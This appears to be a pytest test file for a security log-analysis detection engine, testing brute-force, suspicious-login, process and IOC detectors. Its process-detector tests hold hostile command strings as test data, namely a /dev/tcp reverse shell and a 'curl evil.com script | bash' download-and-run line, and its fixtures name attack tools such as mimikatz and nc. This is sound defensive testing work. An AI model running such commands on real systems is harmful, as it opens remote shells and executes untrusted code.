"""
Test Detection Engine Module
============================
PyTest tests for detection logic.
"""

import pytest
from datetime import datetime, timedelta
from pathlib import Path
import tempfile
import json
import os
import sys

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.core.detection import (
    Detection,
    DetectionType,
    Severity,
    IOCDatabase,
    BruteForceDetector,
    SuspiciousLoginDetector,
    UnknownProcessDetector,
    IOCMatcher,
    DetectionEngine
)
from src.core.log_parser import ParsedLogEntry, LogType


class TestDetection:
    """Tests for Detection dataclass."""
    
    def test_create_detection(self):
        """Test creating a detection."""
        detection = Detection(
            detection_type=DetectionType.BRUTE_FORCE,
            alert="Test alert",
            severity=Severity.HIGH,
            iocs=["IP: 192.168.1.100"],
            source_ips=["192.168.1.100"],
            users=["root"]
        )
        
        assert detection.detection_type == DetectionType.BRUTE_FORCE
        assert detection.severity == Severity.HIGH
        assert len(detection.iocs) == 1
        assert "192.168.1.100" in detection.source_ips
    
    def test_get_log_snippet(self):
        """Test log snippet generation."""
        entries = [
            ParsedLogEntry(
                timestamp=datetime.now(),
                source="server",
                event_type="failed_login",
                raw_log="Failed login attempt 1"
            ),
            ParsedLogEntry(
                timestamp=datetime.now(),
                source="server",
                event_type="failed_login",
                raw_log="Failed login attempt 2"
            )
        ]
        
        detection = Detection(
            detection_type=DetectionType.BRUTE_FORCE,
            alert="Test",
            severity=Severity.HIGH,
            log_entries=entries
        )
        
        snippet = detection.get_log_snippet()
        assert "Failed login attempt 1" in snippet
        assert "Failed login attempt 2" in snippet
    
    def test_get_ioc_string(self):
        """Test IOC string generation."""
        detection = Detection(
            detection_type=DetectionType.IOC_MATCH,
            alert="Test",
            severity=Severity.HIGH,
            iocs=["IP: 1.2.3.4", "Domain: evil.com"]
        )
        
        ioc_str = detection.get_ioc_string()
        assert "IP: 1.2.3.4" in ioc_str
        assert "Domain: evil.com" in ioc_str
    
    def test_to_dict(self):
        """Test conversion to dictionary."""
        detection = Detection(
            detection_type=DetectionType.BRUTE_FORCE,
            alert="Test alert",
            severity=Severity.HIGH
        )
        
        d = detection.to_dict()
        assert d['detection_type'] == 'brute_force'
        assert d['severity'] == 'high'
        assert d['alert'] == 'Test alert'


class TestIOCDatabase:
    """Tests for IOC database."""
    
    @pytest.fixture
    def ioc_db(self):
        """Create an IOC database with test data."""
        db = IOCDatabase()
        db.ip_addresses = {"192.168.1.100", "10.0.0.1"}
        db.domains = {"evil.com", "malware.org"}
        db.process_names = {"mimikatz.exe", "nc.exe"}
        db.usernames = {"hacker", "admin"}
        db.hashes_md5 = {"d41d8cd98f00b204e9800998ecf8427e"}
        return db
    
    def test_check_ip_direct_match(self, ioc_db):
        """Test direct IP matching."""
        assert ioc_db.check_ip("192.168.1.100") is True
        assert ioc_db.check_ip("192.168.1.200") is False
    
    def test_check_domain(self, ioc_db):
        """Test domain matching."""
        assert ioc_db.check_domain("evil.com") is True
        assert ioc_db.check_domain("EVIL.COM") is True  # Case insensitive
        assert ioc_db.check_domain("good.com") is False
    
    def test_check_process(self, ioc_db):
        """Test process name matching."""
        assert ioc_db.check_process("mimikatz.exe") is True
        assert ioc_db.check_process("MIMIKATZ.EXE") is True  # Case insensitive
        assert ioc_db.check_process("notepad.exe") is False
    
    def test_check_username(self, ioc_db):
        """Test username matching."""
        assert ioc_db.check_username("hacker") is True
        assert ioc_db.check_username("legitimate") is False
    
    def test_check_hash(self, ioc_db):
        """Test hash matching."""
        assert ioc_db.check_hash("d41d8cd98f00b204e9800998ecf8427e") is True
        assert ioc_db.check_hash("0000000000000000000000000000000") is False
    
    def test_check_text(self, ioc_db):
        """Test text scanning for IOCs."""
        text = "Connection from 192.168.1.100 to evil.com detected"
        matches = ioc_db.check_text(text)
        
        assert len(matches) >= 2
        assert any("192.168.1.100" in m for m in matches)
        assert any("evil.com" in m for m in matches)
    
    def test_load_from_file(self):
        """Test loading IOCs from JSON file."""
        ioc_data = {
            "ip_addresses": ["1.2.3.4"],
            "domains": ["test.com"],
            "hashes": {"md5": ["abc123"]},
            "process_names": ["bad.exe"],
            "usernames": ["baduser"]
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(ioc_data, f)
            temp_path = f.name
        
        try:
            db = IOCDatabase.load_from_file(Path(temp_path))
            
            assert "1.2.3.4" in db.ip_addresses
            assert "test.com" in db.domains
            assert "bad.exe" in db.process_names
        finally:
            os.unlink(temp_path)
    
    def test_ip_range_matching(self):
        """Test IP range matching."""
        db = IOCDatabase()
        import ipaddress
        db.ip_ranges = [ipaddress.IPv4Network("10.0.0.0/24")]
        
        assert db.check_ip("10.0.0.50") is True
        assert db.check_ip("10.0.1.50") is False


class TestBruteForceDetector:
    """Tests for brute force detection."""
    
    @pytest.fixture
    def detector(self):
        """Create a detector with test settings."""
        return BruteForceDetector(
            failed_threshold=3,
            time_window_minutes=5
        )
    
    def create_failed_login_entry(self, ip, user, timestamp):
        """Helper to create a failed login entry."""
        return ParsedLogEntry(
            timestamp=timestamp,
            source="server",
            event_type="failed_login",
            user=user,
            source_ip=ip,
            raw_log=f"Failed login for {user} from {ip}"
        )
    
    def test_detect_brute_force_single_source(self, detector):
        """Test detection of single-source brute force."""
        base_time = datetime.now()
        entries = [
            self.create_failed_login_entry("192.168.1.100", "root", base_time),
            self.create_failed_login_entry("192.168.1.100", "root", base_time + timedelta(seconds=30)),
            self.create_failed_login_entry("192.168.1.100", "root", base_time + timedelta(seconds=60)),
            self.create_failed_login_entry("192.168.1.100", "root", base_time + timedelta(seconds=90)),
        ]
        
        detections = detector.detect(entries)
        
        assert len(detections) >= 1
        assert detections[0].detection_type == DetectionType.BRUTE_FORCE
        assert "192.168.1.100" in detections[0].source_ips
    
    def test_no_detection_below_threshold(self, detector):
        """Test no detection when below threshold."""
        base_time = datetime.now()
        entries = [
            self.create_failed_login_entry("192.168.1.100", "root", base_time),
            self.create_failed_login_entry("192.168.1.100", "root", base_time + timedelta(seconds=30)),
        ]
        
        detections = detector.detect(entries)
        
        # Should not detect with only 2 failures
        brute_force_detections = [d for d in detections if d.detection_type == DetectionType.BRUTE_FORCE]
        assert len(brute_force_detections) == 0
    
    def test_detect_credential_stuffing(self, detector):
        """Test detection of credential stuffing (same IP, many users)."""
        base_time = datetime.now()
        entries = [
            self.create_failed_login_entry("192.168.1.100", f"user{i}", base_time + timedelta(seconds=i))
            for i in range(10)
        ]
        
        detections = detector.detect(entries)
        
        # Should detect credential stuffing
        assert len(detections) >= 1
        assert any("credential" in d.alert.lower() or d.metadata.get('attack_type') == 'credential_stuffing' 
                   for d in detections)


class TestSuspiciousLoginDetector:
    """Tests for suspicious login detection."""
    
    @pytest.fixture
    def detector(self):
        """Create a detector instance."""
        return SuspiciousLoginDetector(
            unusual_hours=(0, 5),
            trusted_ips={"10.0.0.1"}
        )
    
    def test_detect_unusual_hour_login(self, detector):
        """Test detection of login at unusual hour."""
        entry = ParsedLogEntry(
            timestamp=datetime(2024, 12, 27, 3, 30, 0),  # 3:30 AM
            source="server",
            event_type="successful_login",
            user="admin",
            source_ip="192.168.1.100"
        )
        
        detections = detector.detect([entry])
        
        assert len(detections) >= 1
        assert detections[0].detection_type == DetectionType.SUSPICIOUS_LOGIN
        assert "unusual hour" in detections[0].alert.lower()
    
    def test_detect_privileged_user_external_ip(self, detector):
        """Test detection of privileged user from external IP."""
        entry = ParsedLogEntry(
            timestamp=datetime(2024, 12, 27, 10, 30, 0),
            source="server",
            event_type="successful_login",
            user="root",
            source_ip="192.168.1.100"  # Not in trusted IPs
        )
        
        detections = detector.detect([entry])
        
        # Should detect privileged user from non-trusted IP
        assert any(d.detection_type == DetectionType.SUSPICIOUS_LOGIN 
                   and "privileged" in d.alert.lower() 
                   for d in detections)
    
    def test_detect_rapid_logins_different_ips(self, detector):
        """Test detection of rapid logins from different IPs."""
        base_time = datetime(2024, 12, 27, 10, 30, 0)
        entries = [
            ParsedLogEntry(
                timestamp=base_time,
                source="server",
                event_type="successful_login",
                user="admin",
                source_ip="192.168.1.100"
            ),
            ParsedLogEntry(
                timestamp=base_time + timedelta(minutes=1),
                source="server",
                event_type="successful_login",
                user="admin",
                source_ip="10.10.10.10"  # Different IP
            ),
        ]
        
        detections = detector.detect(entries)
        
        # Should detect rapid successive logins
        assert any(d.detection_type == DetectionType.SUSPICIOUS_LOGIN 
                   and "rapid" in d.alert.lower() 
                   for d in detections)


class TestUnknownProcessDetector:
    """Tests for unknown/suspicious process detection."""
    
    @pytest.fixture
    def detector(self):
        """Create a detector instance."""
        return UnknownProcessDetector()
    
    def test_detect_mimikatz(self, detector):
        """Test detection of mimikatz."""
        entry = ParsedLogEntry(
            timestamp=datetime.now(),
            source="server",
            event_type="sudo_command",
            user="admin",
            metadata={'command': './mimikatz.exe'}
        )
        
        detections = detector.detect([entry])
        
        assert len(detections) >= 1
        assert detections[0].detection_type == DetectionType.UNKNOWN_PROCESS
        assert detections[0].severity == Severity.CRITICAL
    
    def test_detect_reverse_shell_pattern(self, detector):
        """Test detection of reverse shell command."""
        entry = ParsedLogEntry(
            timestamp=datetime.now(),
            source="server",
            event_type="sudo_command",
            user="admin",
            metadata={'command': 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'}
        )
        
        detections = detector.detect([entry])
        
        assert len(detections) >= 1
        assert detections[0].detection_type == DetectionType.UNKNOWN_PROCESS
    
    def test_detect_curl_pipe_shell(self, detector):
        """Test detection of curl | bash pattern."""
        entry = ParsedLogEntry(
            timestamp=datetime.now(),
            source="server",
            event_type="sudo_command",
            user="admin",
            metadata={'command': 'curl http://evil.com/script.sh | bash'}
        )
        
        detections = detector.detect([entry])
        
        assert len(detections) >= 1
        suspicious_detected = any(d.detection_type == DetectionType.UNKNOWN_PROCESS for d in detections)
        assert suspicious_detected


class TestIOCMatcher:
    """Tests for IOC matching."""
    
    @pytest.fixture
    def matcher(self):
        """Create an IOC matcher with test database."""
        db = IOCDatabase()
        db.ip_addresses = {"192.168.1.100", "10.10.10.10"}
        db.process_names = {"malware.exe"}
        db.usernames = {"hacker"}
        return IOCMatcher(db)
    
    def test_match_malicious_ip(self, matcher):
        """Test matching malicious IP."""
        entry = ParsedLogEntry(
            timestamp=datetime.now(),
            source="server",
            event_type="failed_login",
            user="admin",
            source_ip="192.168.1.100",
            raw_log="Test log"
        )
        
        detections = matcher.detect([entry])
        
        assert len(detections) >= 1
        assert detections[0].detection_type == DetectionType.IOC_MATCH
    
    def test_match_suspicious_username(self, matcher):
        """Test matching suspicious username."""
        entry = ParsedLogEntry(
            timestamp=datetime.now(),
            source="server",
            event_type="successful_login",
            user="hacker",
            source_ip="10.0.0.1",
            raw_log="Test log"
        )
        
        detections = matcher.detect([entry])
        
        assert len(detections) >= 1
        assert any("hacker" in d.alert.lower() or "username" in str(d.iocs).lower() 
                   for d in detections)
    
    def test_no_match_clean_entry(self, matcher):
        """Test no match for clean entry."""
        entry = ParsedLogEntry(
            timestamp=datetime.now(),
            source="server",
            event_type="successful_login",
            user="legitimate_user",
            source_ip="10.0.0.50",
            raw_log="Normal login"
        )
        
        detections = matcher.detect([entry])
        assert len(detections) == 0


class TestDetectionEngine:
    """Tests for main detection engine."""
    
    @pytest.fixture
    def engine(self):
        """Create a detection engine."""
        return DetectionEngine(
            brute_force_threshold=3,
            brute_force_window=5
        )
    
    def test_detect_all_runs_all_detectors(self, engine):
        """Test that detect_all runs all detection types."""
        base_time = datetime.now()
        entries = [
            ParsedLogEntry(
                timestamp=base_time + timedelta(seconds=i),
                source="server",
                event_type="failed_login",
                user="root",
                source_ip="192.168.1.100",
                raw_log=f"Failed login {i}"
            )
            for i in range(5)
        ]
        
        detections = engine.detect_all(entries)
        
        # Should have at least brute force detection
        assert len(detections) >= 1
    
    def test_load_iocs(self, engine):
        """Test loading IOCs from file."""
        ioc_data = {
            "ip_addresses": ["1.2.3.4"],
            "domains": ["evil.com"]
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(ioc_data, f)
            temp_path = f.name
        
        try:
            engine.load_iocs(Path(temp_path))
            
            assert "1.2.3.4" in engine.ioc_database.ip_addresses
            assert "evil.com" in engine.ioc_database.domains
        finally:
            os.unlink(temp_path)
    
    def test_individual_detection_methods(self, engine):
        """Test individual detection method access."""
        entries = []
        
        # Test that methods exist and return lists
        assert isinstance(engine.detect_brute_force(entries), list)
        assert isinstance(engine.detect_suspicious_logins(entries), list)
        assert isinstance(engine.detect_unknown_processes(entries), list)
        assert isinstance(engine.detect_ioc_matches(entries), list)


class TestSeverity:
    """Tests for Severity enum."""
    
    def test_severity_values(self):
        """Test severity enum values."""
        assert Severity.LOW.value == "low"
        assert Severity.MEDIUM.value == "medium"
        assert Severity.HIGH.value == "high"
        assert Severity.CRITICAL.value == "critical"


class TestDetectionType:
    """Tests for DetectionType enum."""
    
    def test_detection_type_values(self):
        """Test detection type enum values."""
        assert DetectionType.BRUTE_FORCE.value == "brute_force"
        assert DetectionType.SUSPICIOUS_LOGIN.value == "suspicious_login"
        assert DetectionType.UNKNOWN_PROCESS.value == "unknown_process"
        assert DetectionType.IOC_MATCH.value == "ioc_match"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
